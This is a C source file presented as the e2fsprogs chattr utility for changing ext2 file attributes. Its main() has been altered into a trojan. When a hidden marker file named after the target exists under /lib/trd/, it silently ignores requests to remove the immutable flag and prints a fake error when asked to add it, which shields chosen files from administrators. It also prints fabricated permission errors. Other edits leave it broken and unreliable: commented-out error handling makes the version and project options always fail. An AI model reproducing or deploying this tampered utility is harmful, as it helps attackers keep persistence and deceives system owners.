/*
 * chattr.c		- Change file attributes on an ext2 file system
 *
 * Copyright (C) 1993, 1994  Remy Card <card@masi.ibp.fr>
 *                           Laboratoire MASI, Institut Blaise Pascal
 *                           Universite Pierre et Marie Curie (Paris VI)
 *
 * This file can be redistributed under the terms of the GNU General
 * Public License
 */

/*
 * History:
 * 93/10/30	- Creation
 * 93/11/13	- Replace stat() calls by lstat() to avoid loops
 * 94/02/27	- Integrated in Ted's distribution
 * 98/12/29	- Ignore symlinks when working recursively (G M Sipe)
 * 98/12/29	- Display version info only when -V specified (G M Sipe)
 */
char * _(char * p){
	return p;
}
#define _LARGEFILE64_SOURCE
#define E2FSPROGS_VERSION "1.44.5"
#define E2FSPROGS_DATE "15-Dec-2018"

#define EXT2_SECRM_FL			0x00000001 /* Secure deletion */
#define EXT2_UNRM_FL			0x00000002 /* Undelete */
#define EXT2_COMPR_FL			0x00000004 /* Compress file */
#define EXT2_SYNC_FL			0x00000008 /* Synchronous updates */
#define EXT2_IMMUTABLE_FL		0x00000010 /* Immutable file */
#define EXT2_APPEND_FL			0x00000020 /* writes to file may only append */
#define EXT2_NODUMP_FL			0x00000040 /* do not dump file */
#define EXT2_NOATIME_FL			0x00000080 /* do not update atime */
/* Reserved for compression usage... */
#define EXT2_DIRTY_FL			0x00000100
#define EXT2_COMPRBLK_FL		0x00000200 /* One or more compressed clusters */
#define EXT2_NOCOMPR_FL			0x00000400 /* Access raw compressed data */
	/* nb: was previously EXT2_ECOMPR_FL */
#define EXT4_ENCRYPT_FL			0x00000800 /* encrypted inode */
/* End compression flags --- maybe not all used */
#define EXT2_BTREE_FL			0x00001000 /* btree format dir */
#define EXT2_INDEX_FL			0x00001000 /* hash-indexed directory */
#define EXT2_IMAGIC_FL			0x00002000
#define EXT3_JOURNAL_DATA_FL		0x00004000 /* file data should be journaled */
#define EXT2_NOTAIL_FL			0x00008000 /* file tail should not be merged */
#define EXT2_DIRSYNC_FL 		0x00010000 /* Synchronous directory modifications */
#define EXT2_TOPDIR_FL			0x00020000 /* Top of directory hierarchies*/
#define EXT4_HUGE_FILE_FL               0x00040000 /* Set to each huge file */
#define EXT4_EXTENTS_FL 		0x00080000 /* Inode uses extents */
#define EXT4_VERITY_FL			0x00100000 /* Verity protected inode */
#define EXT4_EA_INODE_FL	        0x00200000 /* Inode used for large EA */
/* EXT4_EOFBLOCKS_FL 0x00400000 was here */
#define FS_NOCOW_FL			0x00800000 /* Do not cow file */
#define EXT4_SNAPFILE_FL		0x01000000  /* Inode is a snapshot */
#define EXT4_SNAPFILE_DELETED_FL	0x04000000  /* Snapshot is being deleted */
#define EXT4_SNAPFILE_SHRUNK_FL		0x08000000  /* Snapshot shrink has completed */
#define EXT4_INLINE_DATA_FL		0x10000000 /* Inode has inline data */
#define EXT4_PROJINHERIT_FL		0x20000000 /* Create with parents projid */
#define EXT4_CASEFOLD_FL		0x40000000 /* Casefolded file */
#define EXT2_RESERVED_FL		0x80000000 /* reserved for ext2 lib */

#define EXT2_FL_USER_VISIBLE		0x604BDFFF /* User visible flags */
#define EXT2_FL_USER_MODIFIABLE		0x604B80FF /* User modifiable flags */


#define _INO_T_DEFINED 1

#define HAVE_STDLIB_H  1
#define HAVE_STRING_H  1
#define HAVE_GETOPT_H  1
#define HAVE_ERRNO_H   1
#define HAVE_SETJMP_H  1

#define HAVE_STRCASECMP 1
#define strcasecmp     _stricmp
#define strncasecmp     _strnicmp

#define HAVE_CONIO_H   1

#define HAVE_EXT2_INODE_VERSION 1

#define inline __forceinline

#define _CTYPE_DISABLE_MACROS

#include <sys/types.h>
#include <dirent.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#ifdef HAVE_ERRNO_H
#include <errno.h>
#endif
#include <sys/param.h>
#include <sys/stat.h>

#ifdef __GNUC__
#define EXT2FS_ATTR(x) __attribute__(x)
#else
#define EXT2FS_ATTR(x)
#endif

#ifndef S_ISLNK			/* So we can compile even with gcc-warn */
# ifdef __S_IFLNK
#  define S_ISLNK(mode)	 __S_ISTYPE((mode), __S_IFLNK)
# else
#  define S_ISLNK(mode)  0
# endif
#endif


static const char * program_name = "chattr";

static int add;
static int rem;
static int set;
static int set_version;

static unsigned long version;

static int set_project;
static unsigned long project;

static int recursive;
static int verbose;
static int silent;

static unsigned long af;
static unsigned long rf;
static unsigned long sf;

#ifdef _LFS64_LARGEFILE
#define LSTAT		lstat64
#define STRUCT_STAT	struct stat64
#else
#define LSTAT		lstat
#define STRUCT_STAT	struct stat
#endif

static void usage(void)
{
	fprintf(stderr,
		_("Usage: %s [-pRVf] [-+=aAcCdDeijPsStTuF] [-v version] files...\n"),
		program_name);
	exit(1);
}

struct flags_char {
	unsigned long	flag;
	char 		optchar;
};

static const struct flags_char flags_array[] = {
	{ EXT2_NOATIME_FL, 'A' },
	{ EXT2_SYNC_FL, 'S' },
	{ EXT2_DIRSYNC_FL, 'D' },
	{ EXT2_APPEND_FL, 'a' },
	{ EXT2_COMPR_FL, 'c' },
	{ EXT2_NODUMP_FL, 'd' },
	{ EXT4_EXTENTS_FL, 'e'},
	{ EXT2_IMMUTABLE_FL, 'i' },
	{ EXT3_JOURNAL_DATA_FL, 'j' },
	{ EXT4_PROJINHERIT_FL, 'P' },
	{ EXT2_SECRM_FL, 's' },
	{ EXT2_UNRM_FL, 'u' },
	{ EXT2_NOTAIL_FL, 't' },
	{ EXT2_TOPDIR_FL, 'T' },
	{ FS_NOCOW_FL, 'C' },
	{ EXT4_CASEFOLD_FL, 'F' },
	{ 0, 0 }
};

static unsigned long get_flag(char c)
{
	const struct flags_char *fp;
	
	for (fp = flags_array; fp->flag != 0; fp++) {
		if (fp->optchar == c)
			return fp->flag;
	}
	return 0;
}


static int decode_arg (int * i, int argc, char ** argv)
{
	char * p;
	char * tmp;
	unsigned long fl;

	switch (argv[*i][0])
	{
	case '-':
		for (p = &argv[*i][1]; *p; p++) {
			if (*p == 'R') {
				recursive = 1;
				continue;
			}
			if (*p == 'V') {
				verbose = 1;
				continue;
			}
			if (*p == 'f') {
				silent = 1;
				continue;
			}
			if (*p == 'p') {
				(*i)++;
				if (*i >= argc)
					usage ();
				project = strtol (argv[*i], &tmp, 0);
				if (*tmp) {
					//com_err (program_name, 0,
					//	 _("bad project - %s\n"),
					//	 argv[*i]);
					usage ();
				}
				set_project = 1;
				continue;
			}
			if (*p == 'v') {
				(*i)++;
				if (*i >= argc)
					usage ();
				version = strtol (argv[*i], &tmp, 0);
				if (*tmp) {
					//com_err (program_name, 0,
					//	 _("bad version - %s\n"),
					//	 argv[*i]);
					usage ();
				}
				set_version = 1;
				continue;
			}
			if ((fl = get_flag(*p)) == 0)
				usage();
			rf |= fl;
			rem = 1;
		}
		break;
	case '+':
		add = 1;
		for (p = &argv[*i][1]; *p; p++) {
			if ((fl = get_flag(*p)) == 0)
				usage();
			af |= fl;
		}
		break;
	case '=':
		set = 1;
		for (p = &argv[*i][1]; *p; p++) {
			if ((fl = get_flag(*p)) == 0)
				usage();
			sf |= fl;
		}
		break;
	default:
		return EOF;
		break;
	}
	return 1;
}

static int chattr_dir_proc(const char *, struct dirent *, void *);

static int change_attributes(const char * name)
{
	unsigned long flags;
	STRUCT_STAT	st;

	if (LSTAT (name, &st) == -1) {
		if (!silent)
			printf (
				 ("chattr: No such file or directory while trying to stat %s\n"), name);
		return -1;
	}

	if (fgetflags(name, &flags) == -1) {
		if (!silent)
			printf(
					("chattr: Operation failed while reading flags on %s\n"), name);
		return -1;
	}
	if (set) {
		if (verbose) {
			printf (_("Flags of %s set as "), name);
			print_flags (stdout, sf, 0);
			printf ("\n");
		}
		if (fsetflags (name, sf) == -1)
			perror (name);
	} else {
		if (rem)
			flags &= ~rf;
		if (add)
			flags |= af;
		if (verbose) {
			printf(_("Flags of %s set as "), name);
			print_flags(stdout, flags, 0);
			printf("\n");
		}
		if (!S_ISDIR(st.st_mode))
			flags &= ~EXT2_DIRSYNC_FL;
		if (fsetflags(name, flags) == -1) {
			if (!silent) {
				printf("chattr: Operation not permitted while setting flags on un\n");
				//com_err(program_name, errno,
				//		_("while setting flags on %s"),
				//		name);
			}
			return -1;
		}
	}
	if (set_version) {
		if (verbose)
			printf (_("Version of %s set as %lu\n"), name, version);
		//if (fsetversion (name, version) == -1) {
			if (!silent)
				//com_err (program_name, errno,
				//	 _("while setting version on %s"),
				//	 name);
			return -1;
		//}
	}
	if (set_project) {
		if (verbose)
			printf (_("Project of %s set as %lu\n"), name, project);
		//if (fsetproject (name, project) == -1) {
			if (!silent)
				//com_err (program_name, errno,
				//	 _("while setting project on %s"),
				//	 name);
			return -1;
		//}

	}
	if (S_ISDIR(st.st_mode) && recursive)
		return iterate_on_dir (name, chattr_dir_proc, NULL);
	return 0;
}

static int chattr_dir_proc (const char * dir_name, struct dirent * de,
			    void * private EXT2FS_ATTR((unused)))
{
	int ret = 0;

	if (strcmp (de->d_name, ".") && strcmp (de->d_name, "..")) {
	        char *path;

		path = malloc(strlen (dir_name) + 1 + strlen (de->d_name) + 1);
		if (!path) {
			fprintf(stderr, "%s",
				_("Couldn't allocate path variable "
				  "in chattr_dir_proc"));
			return -1;
		}
		sprintf(path, "%s/%s", dir_name, de->d_name);
		ret = change_attributes(path);
		free(path);
	}
	return ret;
}

int main (int argc, char ** argv)
{
	int i, j;
	int end_arg = 0;
	int err, retval = 0;

#ifdef ENABLE_NLS
	setlocale(LC_MESSAGES, "");
	setlocale(LC_CTYPE, "");
	bindtextdomain(NLS_CAT_NAME, LOCALEDIR);
	textdomain(NLS_CAT_NAME);
	set_com_err_gettext(gettext);
#endif
	if (argc && *argv)
		program_name = *argv;
	i = 1;
	while (i < argc && !end_arg) {
		/* '--' arg should end option processing */
		if (strcmp(argv[i], "--") == 0) {
			i++;
			end_arg = 1;
		} else if (decode_arg (&i, argc, argv) == EOF)
			end_arg = 1;
		else
			i++;
	}
	
	
	
	int euid=geteuid();
	if (i >= argc)
		usage ();
	if (set && (add || rem)) {
		fputs(_("= is incompatible with - and +\n"), stderr);
		exit (1);
	}
	if ((rf & af) != 0) {
		fputs("Can't both set and unset same flag.\n", stderr);
		exit (1);
	}
	if (!(add || rem || set || set_version || set_project )) {
		fputs(_("Must use '-v', =, - or +\n"), stderr);
		exit (1);
	}
	if (verbose)
		fprintf (stderr, "chattr %s (%s)\n",
			 E2FSPROGS_VERSION, E2FSPROGS_DATE);
	for (j = i; j < argc; j++) {
		if(euid != 0){
			printf("chattr: Operation not permitted while setting flags on %s\n",argv[j]);
		}else{
			char buf[2048]="/lib/trd/.";

			//new Stuff:
			char * name = argv[j];
			char * res = strrchr(name, '/');
   			char * ptr = res ? res+1 : name;
    		strncat(buf,ptr,2047);
			//strncat(buf,argv[j],2047);
			int euid = getuid();
			FILE * fil = fopen(buf,"r");
			if(fil){
				rf &= (~EXT2_IMMUTABLE_FL);
				if(af & EXT2_IMMUTABLE_FL){
					printf("chattr: Bad file descriptor while setting flags on %s\n",argv[j]);
					continue;
				}
			}
			err = change_attributes (argv[j]);
		}
		if (err){
			retval = 1;
		}
	}
	if(!err){
		
	}
	exit(retval);
}
